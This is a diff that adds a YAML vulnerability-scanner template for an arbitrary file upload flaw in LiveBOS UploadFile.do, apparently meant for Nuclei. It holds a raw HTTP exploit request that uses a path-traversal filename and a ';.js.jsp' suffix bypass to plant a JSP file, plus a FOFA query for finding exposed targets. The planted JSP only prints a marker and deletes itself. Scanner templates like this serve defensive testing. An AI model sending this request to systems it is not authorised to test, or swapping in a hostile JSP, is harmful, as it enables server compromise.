@@ -1,0 +1,53 @@
+id: LiveBOS-UploadFile-File-upload
+
+info:
+  name: LiveBOS UploadFile.do 任意文件上传漏洞(XVE-2023-21708)
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="Power by LiveBOS"
+
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /feed/UploadFile.do;.js.jsp HTTP/1.1 
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi
+
+        ------WebKitFormBoundaryxegqoxxi
+        Content-Disposition: form-data; name="file"; filename="/../../../../{{username}}.jsp"
+        Content-Type: image/jpeg
+
+        <%@ page import="java.io.File" %>
+        <%
+          out.println("pboyjnnrfipmplsukdeczudsefxmywe");
+          String filePath = application.getRealPath(request.getServletPath());
+          new File(filePath).delete();
+        %>
+        ------WebKitFormBoundaryxegqoxxi--
+
+      
+      - |
+        GET /{{username}}.jsp;.js.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
